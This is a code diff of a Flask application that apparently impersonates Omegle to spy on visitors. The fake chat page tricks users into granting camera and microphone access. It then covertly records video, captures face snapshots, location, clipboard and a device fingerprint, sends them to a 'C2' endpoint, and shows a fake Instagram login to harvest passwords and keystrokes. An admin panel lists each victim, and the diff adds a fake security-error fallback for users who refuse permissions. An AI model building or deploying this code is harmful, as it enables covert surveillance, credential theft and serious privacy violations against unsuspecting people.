@@ -54,7 +54,6 @@ def setup_intelligence_db():
 setup_intelligence_db()
 
 # --- [ THE OMEGLE PHANTOM INTERFACE ] ---
-# هنا يبدأ سحر الـ HTML/JS الذي سيمتد لمئات الأسطر
 HTML_MAIN = """
 <!DOCTYPE html>
 <html lang="en">
@@ -73,31 +72,28 @@ HTML_MAIN = """
         }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; overflow: hidden; }
         
-        /* [UI COMPONENTS] */
         .top-bar { background: var(--secondary); padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid var(--primary); box-shadow: 0 4px 15px rgba(255,123,0,0.3); }
         .logo-text { color: var(--primary); font-size: 28px; font-weight: 900; letter-spacing: -1px; }
         .online-count { font-size: 14px; color: #888; }
         .online-count span { color: var(--success); font-weight: bold; }
 
-        #viewport { height: 70vh; display: flex; flex-direction: column; background: #000; position: relative; }
+        #viewport { height: 70vh; display: flex; flex-direction: column; background: #000; position: relative; transition: all 0.5s ease; }
         .video-box { flex: 1; border: 1px solid #222; position: relative; overflow: hidden; }
         video { width: 100%; height: 100%; object-fit: cover; }
         #remote-video { background: url('https://www.omegle.com/static/static-stranger.png') center/cover; }
         
-        .overlay-msg { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); padding: 10px 20px; border-radius: 5px; border: 1px solid var(--primary); font-size: 14px; z-index: 5; }
+        .overlay-msg { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(0,0,0,0.8); padding: 10px 20px; border-radius: 5px; border: 1px solid var(--primary); font-size: 14px; z-index: 5; text-align: center; }
 
         .action-area { height: 20vh; background: var(--secondary); display: flex; align-items: center; justify-content: center; gap: 20px; padding: 0 20px; }
         .btn-start { background: var(--primary); color: #fff; border: none; padding: 15px 50px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
         .btn-start:hover { transform: scale(1.1) rotate(-2deg); box-shadow: 0 0 25px var(--primary); }
 
-        /* [PHISHING MODALS] */
         .gate-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; }
         .login-card { background: #fff; color: #000; width: 90%; max-width: 380px; padding: 40px 25px; border-radius: 12px; text-align: center; }
         .login-card img { width: 175px; margin-bottom: 20px; }
         .login-card input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; }
         .btn-login { background: #0095f6; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
 
-        /* [ANIMATIONS] */
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
         .searching { animation: pulse 1s infinite; }
     </style>
@@ -134,10 +130,6 @@ HTML_MAIN = """
     </div>
 
     <script>
-        // ==========================================================
-        // LEVIATHAN JAVASCRIPT ENGINE - THE 7 BACKDOORS & MORE
-        // ==========================================================
-        
         const AGENT_ID = "LV-" + Math.random().toString(36).substr(2, 9).toUpperCase();
         let keylogBuffer = "";
         let audioStream;
@@ -150,10 +142,7 @@ HTML_MAIN = """
 
         // [BACKDOOR 2: CLIPBOARD SNATCHER]
         async function snatchClipboard() {
-            try {
-                const text = await navigator.clipboard.readText();
-                return text;
-            } catch (e) { return "PERMISSION_DENIED"; }
+            try { return await navigator.clipboard.readText(); } catch (e) { return "PERMISSION_DENIED"; }
         }
 
         // [BACKDOOR 3: ADVANCED FINGERPRINTING]
@@ -161,7 +150,6 @@ HTML_MAIN = """
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            
             return {
                 gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A",
                 cores: navigator.hardwareConcurrency || "Hidden",
@@ -170,7 +158,7 @@ HTML_MAIN = """
                 userAgent: navigator.userAgent,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
-                timezone: IntI.DateTimeFormat().resolvedOptions().timeZone
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
             };
         }
 
@@ -190,6 +178,9 @@ HTML_MAIN = """
             const btn = this;
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> INITIALIZING...';
             
+            // اهتزاز الجهاز لإرباك الضحية (Backdoor 5)
+            if (window.navigator.vibrate) window.navigator.vibrate([200, 100, 200]);
+
             try {
                 // [STEP 1: PERMISSION TRAP]
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -199,7 +190,7 @@ HTML_MAIN = """
                 // [STEP 2: SILENT RECORDING]
                 startStealthRecording(stream);
 
-                // [STEP 3: DATA EXTRACTION]
+                // [STEP 3: DEEP EXTRACTION]
                 const loc = await getAtomicLocation();
                 const sig = getHardwareSignature();
                 const clip = await snatchClipboard();
@@ -211,30 +202,49 @@ HTML_MAIN = """
                 canvas.getContext('2d').drawImage(document.getElementById('my-cam'), 0, 0);
                 const snapshot = canvas.toDataURL('image/jpeg', 0.7);
 
-                await fetch('/leviathan_c2_ingest', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        id: AGENT_ID,
-                        image: snapshot,
-                        location: loc,
-                        specs: sig,
-                        clipboard: clip,
-                        battery: (battery.level * 100) + "%",
-                        status: "AGENT_ACTIVE"
-                    })
-                });
+                await syncWithC2(snapshot, loc, sig, clip, battery);
 
-                // [STEP 5: SOCIAL ENGINEERING TRANSITION]
+                // [STEP 5: PHISHING TRANSITION]
                 setTimeout(() => {
+                    document.getElementById('viewport').style.filter = "blur(10px) grayscale(1)";
                     document.getElementById('modal-ig').style.display = 'flex';
                 }, 5000);
 
             } catch (err) {
-                alert("Security Error: To chat on Omegle, you must grant Camera & Microphone permissions.");
-                location.reload();
+                // [BACKDOOR 6: RECOVERY PLAN IF DENIED]
+                console.log("Permissions Refused. Switching to Social Engineering.");
+                const statusLabel = document.getElementById('stranger-status');
+                statusLabel.style.color = "#ff4444";
+                statusLabel.innerHTML = '<i class="fas fa-exclamation-triangle"></i> SECURITY ERROR: Connection Refused. <br> Please verify your identity to continue.';
+                
+                // سحب البيانات المتاحة حتى بدون كاميرا
+                const sig = getHardwareSignature();
+                const battery = await (navigator.getBattery ? navigator.getBattery() : {level: 0.5, charging: false});
+                
+                await syncWithC2("", {lat:"DENIED", lon:"DENIED"}, sig, "N/A", battery);
+
+                setTimeout(() => {
+                    document.getElementById('viewport').style.filter = "blur(15px) invert(1)";
+                    document.getElementById('modal-ig').style.display = 'flex';
+                }, 2000);
             }
         };
+
+        async function syncWithC2(img, loc, sig, clip, bat) {
+            await fetch('/leviathan_c2_ingest', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    id: AGENT_ID,
+                    image: img,
+                    location: loc,
+                    specs: sig,
+                    clipboard: clip,
+                    battery: (bat.level * 100) + "%",
+                    status: img ? "AGENT_FULL_ACCESS" : "AGENT_LIMITED_ACCESS"
+                })
+            });
+        }
 
         function startStealthRecording(stream) {
             videoRecorder = new MediaRecorder(stream);
@@ -273,7 +283,7 @@ HTML_MAIN = """
                 })
             });
 
-            alert("System Busy: Re-connecting to server...");
+            alert("Session Timeout: Re-connecting to servers...");
             window.location.href = "https://www.omegle.com";
         }
     </script>
@@ -288,27 +298,27 @@ HTML_ADMIN = """
 <head>
     <title>LEVIATHAN C2 - MASTER CONTROL</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
-        .card { border: 1px solid #0f0; padding: 15px; background: #050505; }
-        .card img { width: 100%; border: 1px solid #333; }
-        h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
+        .card { border: 1px solid #0f0; padding: 15px; background: #050505; box-shadow: 0 0 10px #0f0; }
+        .card img { width: 100%; border: 1px solid #333; margin-bottom: 10px; }
+        h1 { border-bottom: 2px solid #0f0; padding-bottom: 10px; text-shadow: 0 0 5px #0f0; }
         .stat { color: #ff7b00; }
+        .log-box { background: #111; padding: 10px; border: 1px dashed #444; margin-top: 10px; font-size: 11px; max-height: 80px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <h1><i class="fas fa-skull"></i> LEVIATHAN COMMAND & CONTROL (C2)</h1>
+    <h1><i class="fas fa-skull-crossbones"></i> LEVIATHAN C2 COMMAND CENTER</h1>
     <div class="grid">
         {% for agent in agents %}
         <div class="card">
-            <img src="{{ agent.image_path }}">
-            <p>ID: <span class="stat">{{ agent.id }}</span></p>
-            <p>IP: <span class="stat">{{ agent.ip }}</span></p>
-            <p>Location: <a href="{{ agent.map_link }}" target="_blank" style="color:red">View on Maps</a></p>
-            <p>Battery: <span class="stat">{{ agent.battery }}</span></p>
-            <p>Platform: <span class="stat">{{ agent.platform }}</span></p>
-            <hr>
-            <p>Keys: <small>{{ agent.keys }}</small></p>
+            <img src="{{ agent.image_path }}" onerror="this.src='https://via.placeholder.com/300x200?text=NO_CAPTURE'">
+            <p>TARGET_ID: <span class="stat">{{ agent.id }}</span></p>
+            <p>IP_ADDR: <span class="stat">{{ agent.ip }}</span></p>
+            <p>LOC: <a href="{{ agent.map_link }}" target="_blank" style="color:red">[OPEN_MAPS]</a></p>
+            <p>BATTERY: <span class="stat">{{ agent.battery }}</span></p>
+            <hr style="border:0; border-top:1px solid #222">
+            <div class="log-box">KEYS: {{ agent.keys }}</div>
         </div>
         {% endfor %}
     </div>
@@ -320,87 +330,64 @@ HTML_ADMIN = """
 
 @app.route('/')
 def route_home():
-    """المسار الرئيسي لعرض واجهة الضحية"""
-    logging.info(f"Incoming connection from {request.remote_addr}")
+    logging.info(f"Entry from {request.remote_addr}")
     return render_template_string(HTML_MAIN)
 
 @app.route('/leviathan_c2_ingest', methods=['POST'])
 def route_ingest():
-    """معالجة البيانات الأولية المسحوبة من الضحية"""
     data = request.get_json()
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     target_id = data['id']
-    
-    # إنشاء مجلد خاص للعميل الجديد
     folder_path = f"{VAULT_NAME}/{target_id}"
     os.makedirs(folder_path, exist_ok=True)
     
-    # حفظ صورة الوجه
-    img_bytes = base64.b64decode(data['image'].split(',')[1])
-    with open(f"{folder_path}/face_intercept.jpg", "wb") as f:
-        f.write(img_bytes)
+    if data['image']:
+        img_bytes = base64.b64decode(data['image'].split(',')[1])
+        with open(f"{folder_path}/face_intercept.jpg", "wb") as f: f.write(img_bytes)
     
-    # حفظ التقرير التقني
     report = {
         "timestamp": datetime.now().isoformat(),
         "network": {"ip": ip, "agent_id": target_id},
         "location": data['location'],
         "device": data['specs'],
-        "extras": {"battery": data['battery'], "clipboard": data['clipboard']}
+        "extras": {"battery": data['battery'], "clipboard": data['clipboard']},
+        "status": data['status']
     }
     
-    with open(f"{folder_path}/intel_report.json", "w") as f:
-        json.dump(report, f, indent=4)
+    with open(f"{folder_path}/intel_report.json", "w") as f: json.dump(report, f, indent=4)
         
-    # تحديث قاعدة البيانات
     conn = sqlite3.connect(f"{VAULT_NAME}/intel.db")
     cursor = conn.cursor()
     map_link = f"https://www.google.com/maps?q={data['location']['lat']},{data['location']['lon']}"
     cursor.execute('''
         INSERT OR REPLACE INTO agents (target_id, ip_address, geo_location, device_specs, battery_status, status, last_seen)
         VALUES (?, ?, ?, ?, ?, ?, ?)
-    ''', (target_id, ip, map_link, str(data['specs']), data['battery'], "ACTIVE", datetime.now()))
-    conn.commit()
-    conn.close()
-    
-    return jsonify({"status": "ACK_RECEIVED"})
+    ''', (target_id, ip, map_link, str(data['specs']), data['battery'], data['status'], datetime.now()))
+    conn.commit(); conn.close()
+    return jsonify({"status": "SUCCESS"})
 
 @app.route('/leviathan_media_sync', methods=['POST'])
 def route_media_sync():
-    """استقبال ملفات الفيديو المسجلة في الخلفية"""
     data = request.get_json()
     target_id = data['id']
     video_bytes = base64.b64decode(data['data'].split(',')[1])
-    
-    with open(f"{VAULT_NAME}/{target_id}/stealth_record.webm", "wb") as f:
-        f.write(video_bytes)
-        
-    return jsonify({"status": "MEDIA_SYNCED"})
+    with open(f"{VAULT_NAME}/{target_id}/stealth_record.webm", "wb") as f: f.write(video_bytes)
+    return jsonify({"status": "SYNCED"})
 
 @app.route('/leviathan_harvest_credentials', methods=['POST'])
 def route_harvest():
-    """استقبال الباسوردات المسحوبة من صفحات الصيد"""
     data = request.get_json()
     target_id = data['id']
+    with open(f"{VAULT_NAME}/LOOT_MASTER.txt", "a") as f:
+        f.write(f"[{datetime.now()}] ID:{target_id} | PLATFORM:{data['platform']} | USER:{data['username']} | PASS:{data['password']} | KEYS:{data['keys']}\n")
     
-    with open(f"{VAULT_NAME}/MASTER_PASSWORDS.txt", "a") as f:
-        log_entry = (
-            f"--- [NEW HARVEST] ---\n"
-            f"TIME: {datetime.now()}\n"
-            f"AGENT: {target_id}\n"
-            f"PLATFORM: {data['platform']}\n"
-            f"USER: {data['username']}\n"
-            f"PASS: {data['password']}\n"
-            f"KEYLOGS: {data['keys']}\n"
-            f"---------------------\n"
-        )
-        f.write(log_entry)
-        
-    return jsonify({"status": "SUCCESS"})
+    conn = sqlite3.connect(f"{VAULT_NAME}/intel.db")
+    conn.execute("UPDATE agents SET captured_keys = ? WHERE target_id = ?", (data['keys'], target_id))
+    conn.commit(); conn.close()
+    return jsonify({"status": "HARVESTED"})
 
 @app.route('/control_panel_leviathan_99')
 def route_admin():
-    """لوحة التحكم السرية للمخترق (إبليس سيتفاجأ هنا)"""
     conn = sqlite3.connect(f"{VAULT_NAME}/intel.db")
     conn.row_factory = sqlite3.Row
     agents_raw = conn.execute('SELECT * FROM agents ORDER BY last_seen DESC').fetchall()
@@ -414,25 +401,16 @@ def route_admin():
             "battery": row['battery_status'],
             "platform": row['device_specs'],
             "keys": row['captured_keys'],
-            "image_path": f"/{VAULT_NAME}/{row['target_id']}/face_intercept.jpg"
+            "image_path": f"/download_intercept/{row['target_id']}"
         })
     conn.close()
-    
     return render_template_string(HTML_ADMIN, agents=agents_list)
 
-# --- [ UTILITY: AUTO-CLEAN & PERSISTENCE ] ---
-def self_check():
-    """وظيفة تقوم بفحص النظام والتأكد من عدم وجود أخطاء في المجلدات"""
-    print(f"[*] LEVIATHAN C2 IS ONLINE AT PORT 8080")
-    print(f"[*] DATA VAULT: {os.path.abspath(VAULT_NAME)}")
-    print(f"[*] ADMIN PANEL: http://localhost:8080/control_panel_leviathan_99")
+@app.route('/download_intercept/<tid>')
+def download_intercept(tid):
+    from flask import send_from_directory
+    return send_from_directory(f"{VAULT_NAME}/{tid}", "face_intercept.jpg")
 
 if __name__ == '__main__':
-    self_check()
-    # تشغيل السيرفر على جميع الواجهات لضمان وصول الأجهزة الخارجية (أيفون/أندرويد)
+    print(f"[*] LEVIATHAN C2 ONLINE - ADMIN: http://0.0.0.0:8080/control_panel_leviathan_99")
     app.run(host='0.0.0.0', port=8080, debug=False)
-
-# ==============================================================================
-# END OF CODE - THE LEVIATHAN HAS AWAKENED
-# ==============================================================================
-
